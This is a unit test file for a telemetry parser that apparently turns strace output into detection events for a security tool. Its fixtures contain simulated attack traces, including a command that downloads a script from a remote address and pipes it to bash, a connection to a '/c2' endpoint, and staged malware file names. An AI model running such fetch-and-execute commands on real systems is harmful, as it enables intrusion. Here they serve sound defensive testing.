"""Unit tests for TelemetryHarvester."""

from hecate_agent.core.telemetry_harvester import TelemetryHarvester


def test_parse_strace_execve_single_process() -> None:
    raw_trace = """
execve("/usr/bin/whoami", ["whoami"], 0x7ffd860170b8 /* 98 vars */) = 0
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+++ exited with 0 +++
"""
    harvester = TelemetryHarvester(filter_os_noise=True)
    events = harvester.parse_strace(raw_trace, is_intrusion=True)

    assert len(events) == 1
    ev = events[0]
    assert ev["category"] == "process_creation"
    assert ev["Image"] == "/usr/bin/whoami"
    assert ev["CommandLine"] == "whoami"
    assert ev["is_intrusion"] is True


def test_parse_strace_execve_process_tree() -> None:
    raw_trace = """
execve("/usr/bin/sh", ["sh", "-c", "curl -s http://10.0.0.1/p.sh | bash"], 0x7ffd) = 0
strace: Process 1001 attached
[pid 1001] execve("/usr/bin/curl", ["curl", "-s", "http://10.0.0.1/p.sh"], 0x55aa) = 0
strace: Process 1002 attached
[pid 1002] execve("/bin/bash", ["bash"], 0x55bb) = 0
+++ exited with 0 +++
"""
    harvester = TelemetryHarvester()
    events = harvester.parse_strace(raw_trace)

    assert len(events) == 3
    assert events[0]["Image"] == "/usr/bin/sh"
    assert events[1]["Image"] == "/usr/bin/curl"
    assert events[1]["ParentImage"] == "/usr/bin/sh"
    assert events[2]["Image"] == "/bin/bash"


def test_parse_strace_network_connection() -> None:
    raw_trace = """
[pid 2001] execve("/usr/bin/curl", ["curl", "http://45.33.32.156:8080/c2"], 0x7ffd) = 0
[pid 2001] connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("45.33.32.156")}, 16) = -1 EINPROGRESS
"""
    harvester = TelemetryHarvester()
    events = harvester.parse_strace(raw_trace)

    assert len(events) == 2
    net_ev = events[1]
    assert net_ev["category"] == "network_connection"
    assert net_ev["DestinationIp"] == "45.33.32.156"
    assert net_ev["DestinationPort"] == 8080
    assert net_ev["Image"] == "/usr/bin/curl"
    assert net_ev["Initiated"] is True


def test_parse_strace_file_events_and_filtering() -> None:
    raw_trace = """
[pid 3001] execve("/bin/sh", ["sh"], 0x7ffd) = 0
[pid 3001] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
[pid 3001] openat(AT_FDCWD, "/tmp/evil_stager.sh", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4
[pid 3001] creat("/tmp/second_stage.bin", 0755) = 5
[pid 3001] rename("/tmp/evil_stager.sh", "/tmp/active_stager.sh") = 0
[pid 3001] unlink("/tmp/active_stager.sh") = 0
"""
    harvester = TelemetryHarvester(filter_os_noise=True)
    events = harvester.parse_strace(raw_trace)

    file_events = [e for e in events if e["category"] == "file_event"]
    assert len(file_events) == 4

    assert file_events[0]["TargetFilename"] == "/tmp/evil_stager.sh"
    assert file_events[0]["Action"] == "write"

    assert file_events[1]["TargetFilename"] == "/tmp/second_stage.bin"
    assert file_events[1]["Action"] == "create"

    assert file_events[2]["TargetFilename"] == "/tmp/active_stager.sh"
    assert file_events[2]["OriginalFilename"] == "/tmp/evil_stager.sh"
    assert file_events[2]["Action"] == "rename"

    assert file_events[3]["TargetFilename"] == "/tmp/active_stager.sh"
    assert file_events[3]["Action"] == "delete"


def test_parse_json_telemetry() -> None:
    harvester = TelemetryHarvester()
    json_data = [
        {"category": "process_creation", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "whoami"},
        {"category": "network_connection", "DestinationIp": "1.1.1.1", "DestinationPort": 443},
    ]
    events = harvester.parse_json(json_data, is_intrusion=True)
    assert len(events) == 2
    assert events[0]["is_intrusion"] is True
    assert events[1]["is_intrusion"] is True
